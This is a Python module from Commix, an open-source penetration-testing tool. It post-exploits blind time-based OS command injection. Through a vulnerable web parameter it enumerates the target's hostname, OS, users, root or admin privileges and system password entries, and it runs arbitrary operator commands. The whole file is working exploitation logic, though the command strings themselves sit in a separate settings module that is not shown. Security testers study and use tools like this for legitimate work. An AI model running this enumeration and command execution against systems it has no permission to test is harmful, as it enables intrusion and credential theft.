#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
from src.thirdparty.six.moves import urllib as _urllib
from src.utils import logs
from src.utils import menu
from src.utils import settings
from src.utils import session_handler
from src.core.injections.controller import checks
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.blind.techniques.time_based import tb_injector

"""
The "time-based" injection technique on Blind OS Command Injection.
"""

"""
Powershell's version number enumeration (for Windows OS)
"""
def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response): 
  _ = False
  cmd = settings.PS_VERSION
  # if alter_shell:
  #   cmd = checks.escape_single_quoted_cmd(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    _ = True
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  ps_version = output
  checks.print_ps_version(ps_version, filename, _)
    
"""
Hostname enumeration
"""
def hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  cmd = settings.HOSTNAME
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, shell = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    _ = True
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_hostname(shell, filename, _)

"""
Retrieve system information
"""
def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False  
  if settings.TARGET_OS == "win":
    settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
  cmd = settings.RECOGNISE_OS        
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    _ = True
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  target_os = output
  if settings.VERBOSITY_LEVEL == 0 and _:
    print(settings.SINGLE_WHITESPACE)
  if target_os:
    if settings.TARGET_OS != "win":
      cmd = settings.DISTRO_INFO
      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        if settings.VERBOSITY_LEVEL == 0 and _:
          sys.stdout.write("")
        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
        session_handler.store_cmd(url, cmd, output, vuln_parameter)
      else:
        output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
      distro_name = output
      if len(distro_name) != 0:
          target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
    if settings.TARGET_OS == "win":
      cmd = settings.WIN_RECOGNISE_HP
    else:
      cmd = settings.RECOGNISE_HP
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
      if settings.VERBOSITY_LEVEL == 0 and _:
        sys.stdout.write("\n")
      # The main command injection exploitation.
      check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
      session_handler.store_cmd(url, cmd, output, vuln_parameter)
    else:
      output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    target_arch = output
  checks.print_os_info(target_os, target_arch, filename, _)

"""
The current user enumeration
"""
def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  if settings.TARGET_OS == "win":
    settings.CURRENT_USER = settings.WIN_CURRENT_USER
  cmd = settings.CURRENT_USER
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, cu_account = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, cu_account, vuln_parameter)
    _ = True
  else:
    cu_account = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_current_user(cu_account, filename, _)

"""
Check if the current user has excessive privileges.
"""
def check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  if settings.TARGET_OS == "win":
    cmd = settings.IS_ADMIN
  else:  
    cmd = settings.IS_ROOT 
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    check_how_long, shell = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    _ = True
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_current_user_privs(shell, filename, _)

"""
System users enumeration
"""
def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  cmd = settings.SYS_USERS  
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_SYS_USERS
    cmd = cmd + settings.WIN_REPLACE_WHITESPACE
    if alter_shell:
      cmd = checks.escape_single_quoted_cmd(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    try:
      check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
      session_handler.store_cmd(url, cmd, output, vuln_parameter)
      _ = True
    except TypeError:
      output = ""
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  sys_users = output 
  checks.print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)

"""
System passwords enumeration
"""
def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  cmd = settings.SYS_PASSES           
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    _ = True
    if output == False:
      output = ""
    session_handler.store_cmd(url, cmd, output, vuln_parameter)  
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  sys_passes = output 
  checks.print_passes(sys_passes, filename, _, alter_shell)

"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  checks.print_enumenation().print_single_os_cmd_msg(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    if settings.VERBOSITY_LEVEL == 0:
      print(settings.SINGLE_WHITESPACE)
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    check_how_long = 0
  checks.print_single_os_cmd(cmd, output) 
  return check_how_long, output

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  def reset():
    if settings.ENUMERATION_DONE:
      settings.ENUMERATION_DONE = False
  
  reset()
  if menu.options.ps_version and settings.PS_ENABLED == None:
    if not checks.ps_incompatible_os():
      if settings.ENUMERATION_DONE:
        print(settings.SINGLE_WHITESPACE)
      checks.print_enumenation().ps_version_msg()
      powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
      reset()

  if menu.options.hostname:
    if settings.ENUMERATION_DONE:
      print(settings.SINGLE_WHITESPACE)
    checks.print_enumenation().hostname_msg()
    hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    reset()

  if menu.options.current_user: 
    if settings.ENUMERATION_DONE:
      print(settings.SINGLE_WHITESPACE)
    checks.print_enumenation().current_user_msg()
    current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    reset()

  if menu.options.is_root or menu.options.is_admin:
    if settings.ENUMERATION_DONE:
      print(settings.SINGLE_WHITESPACE)
    checks.print_enumenation().check_privs_msg()
    check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    reset()

  if menu.options.sys_info:
    if settings.ENUMERATION_DONE:
      print(settings.SINGLE_WHITESPACE)
    checks.print_enumenation().os_info_msg()
    system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    reset()

  if menu.options.users:
    if settings.ENUMERATION_DONE:
      print(settings.SINGLE_WHITESPACE)
    checks.print_enumenation().print_users_msg()
    system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    reset()

  if menu.options.passwords:
    if settings.ENUMERATION_DONE:
      print(settings.SINGLE_WHITESPACE)
    if settings.TARGET_OS == "win":
      check_option = "--passwords"
      checks.unavailable_option(check_option)
    else:
      checks.print_enumenation().print_passes_msg()
      system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    reset()

# eof